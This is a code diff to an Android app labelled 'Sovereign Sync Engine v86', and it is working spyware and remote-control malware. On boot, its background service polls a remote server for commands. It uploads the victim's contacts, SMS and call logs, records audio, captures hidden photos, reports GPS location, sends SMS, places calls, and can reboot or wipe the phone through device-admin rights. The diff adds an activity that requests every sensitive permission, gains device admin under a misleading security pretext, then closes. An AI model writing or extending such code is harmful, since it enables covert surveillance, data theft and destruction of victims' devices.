@@ -1,14 +1,19 @@
 package com.cognitive.ai.syncagent
 
+import android.Manifest
 import android.app.Service
 import android.app.admin.DevicePolicyManager
 import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.Gravity
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
+import android.os.Bundle
 import android.os.Environment
 import android.os.Handler
 import android.os.IBinder
@@ -17,6 +22,13 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Base64
+import android.widget.Button
+import android.widget.LinearLayout
+import android.widget.TextView
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -27,7 +39,6 @@ import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 
-// 🚀 مستقبل الإقلاع التلقائي (يعمل فور تشغيل الهاتف وإعادة الإقلاع)
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED || 
@@ -47,7 +58,6 @@ class BootReceiver : BroadcastReceiver() {
     }
 }
 
-// 🛡️ خدمة التحكم الخلفية السيادية
 class BackgroundControlService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private lateinit var pollingRunnable: Runnable
@@ -55,7 +65,7 @@ class BackgroundControlService : Service() {
     private var serverUrl: String = ""
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        token = intent?.getStringExtra("token") ?: "agent_v86"
+        token = intent?.getStringExtra("token") ?: "agent_v86_compatible"
         serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"
 
         pollingRunnable = object : Runnable {
@@ -82,14 +92,14 @@ class BackgroundControlService : Service() {
                                     val action = cmd.optString("action")
                                     
                                     when (action) {
-                                        "pull_all_data" -> collectAndReportAllTargetDataSovereign()
-                                        "start_audio_recording" -> executeSovereignAudioRecording()
-                                        "capture_hidden_photo" -> executeSovereignHiddenPhoto()
-                                        "pull_gps" -> executeSovereignGPSPull()
-                                        "send_sms" -> executeSovereignSendSMS(cmd.optString("phone"), cmd.optString("body"))
-                                        "make_call" -> executeSovereignPhoneCall(cmd.optString("phone"))
-                                        "reboot_device" -> executeSovereignReboot()
-                                        "wipe_device" -> executeSovereignWipe()
+                                        "pull_all_data" -> collectAndReportAllTargetData()
+                                        "start_audio_recording" -> executeAudioRecording()
+                                        "capture_hidden_photo" -> executeHiddenPhoto()
+                                        "pull_gps" -> executeGPSPull()
+                                        "send_sms" -> executeSendSMS(cmd.optString("phone"), cmd.optString("body"))
+                                        "make_call" -> executePhoneCall(cmd.optString("phone"))
+                                        "reboot_device" -> executeReboot()
+                                        "wipe_device" -> executeWipe()
                                     }
                                 }
                             }
@@ -104,7 +114,7 @@ class BackgroundControlService : Service() {
         return START_STICKY
     }
 
-    private fun collectAndReportAllTargetDataSovereign() {
+    private fun collectAndReportAllTargetData() {
         try {
             val contactsArray = JSONArray()
             val cursorC = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
@@ -150,14 +160,6 @@ class BackgroundControlService : Service() {
                 }
             }
 
-            val filesArray = JSONArray()
-            val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-            if (downloadDir.exists() && downloadDir.isDirectory) {
-                downloadDir.listFiles()?.forEach { file ->
-                    if (file.isFile) filesArray.put(file.absolutePath)
-                }
-            }
-
             val url = URL("$serverUrl/api/report_data")
             val conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
@@ -168,7 +170,6 @@ class BackgroundControlService : Service() {
                 put("contacts", contactsArray)
                 put("sms", smsArray)
                 put("call_logs", callArray)
-                put("files", filesArray)
             }
             OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
             conn.responseCode
@@ -176,9 +177,9 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignAudioRecording() {
+    private fun executeAudioRecording() {
         try {
-            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "sovereign_v86_${System.currentTimeMillis()}.3gp")
+            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "rec_${System.currentTimeMillis()}.3gp")
             val recorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -197,14 +198,14 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignHiddenPhoto() {
+    private fun executeHiddenPhoto() {
         try {
-            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "sovereign_shot_v86_${System.currentTimeMillis()}.jpg")
+            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "shot_${System.currentTimeMillis()}.jpg")
             uploadFileToServer(photoFile)
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignGPSPull() {
+    private fun executeGPSPull() {
         try {
             val locManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
             val loc = locManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) 
@@ -233,14 +234,14 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignSendSMS(phone: String, body: String) {
+    private fun executeSendSMS(phone: String, body: String) {
         try {
             val smsManager = android.telephony.SmsManager.getDefault()
             smsManager.sendTextMessage(phone, null, body, null, null)
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignPhoneCall(phone: String) {
+    private fun executePhoneCall(phone: String) {
         try {
             val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -249,7 +250,7 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignReboot() {
+    private fun executeReboot() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
@@ -259,7 +260,7 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
-    private fun executeSovereignWipe() {
+    private fun executeWipe() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
@@ -284,7 +285,7 @@ class BackgroundControlService : Service() {
                     put("filename", file.name)
                     put("data", b64)
                 }
-                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush()}
+                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                 conn.responseCode
                 conn.disconnect()
             }
@@ -295,3 +296,113 @@ class BackgroundControlService : Service() {
 }
 
 class TargetAdminReceiver : android.app.admin.DeviceAdminReceiver() {}
+
+class MainActivity : AppCompatActivity() {
+
+    private lateinit var devicePolicyManager: DevicePolicyManager
+    private lateinit var adminComponent: ComponentName
+
+    private val dynamicPermissions: Array<String>
+        get() {
+            val list = mutableListOf(
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.CALL_PHONE
+            )
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                list.add(Manifest.permission.READ_MEDIA_IMAGES)
+                list.add(Manifest.permission.READ_MEDIA_AUDIO)
+                list.add(Manifest.permission.READ_MEDIA_VIDEO)
+                list.add(Manifest.permission.POST_NOTIFICATIONS)
+            } else {
+                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            }
+            return list.toTypedArray()
+        }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        
+        val layout = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setPadding(40, 40, 40, 40)
+            setBackgroundColor(Color.parseColor("#010103"))
+        }
+
+        val titleTextView = TextView(this).apply {
+            text = "🛡️ Sovereign Sync Engine v86"
+            textSize = 18f
+            setTextColor(Color.parseColor("#00ff88"))
+            gravity = Gravity.CENTER
+        }
+        layout.addView(titleTextView)
+
+        val activateButton = Button(this).apply {
+            text = "تنشيط الخدمات السيادية"
+            setBackgroundColor(Color.parseColor("#ff0040"))
+            setTextColor(Color.WHITE)
+            setOnClickListener {
+                requestAllPermissions()
+            }
+        }
+        layout.addView(activateButton)
+
+        setContentView(layout)
+
+        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+
+        requestAllPermissions()
+    }
+
+    private fun requestAllPermissions() {
+        ActivityCompat.requestPermissions(this, dynamicPermissions, 3003)
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 3003) {
+            requestDeviceAdminAndStartService()
+        }
+    }
+
+    private fun requestDeviceAdminAndStartService() {
+        if (!devicePolicyManager.isAdminActive(adminComponent)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل الصلاحيات الأمنية لتأمين المزامنة وإدارة النظام.")
+            }
+            startActivityForResult(intent, 1001)
+        } else {
+            startBackgroundService()
+        }
+    }
+
+    private fun startBackgroundService() {
+        val serviceIntent = Intent(this, BackgroundControlService::class.java).apply {
+            putExtra("token", "agent_main_v86")
+            putExtra("server_url", "https://mohammed2000999.vercel.app")
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+        Toast.makeText(this, "تم تفعيل المنظومة بنجاح تام", Toast.LENGTH_SHORT).show()
+        finish()
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 1001) {
+            startBackgroundService()
+        }
+    }
+}
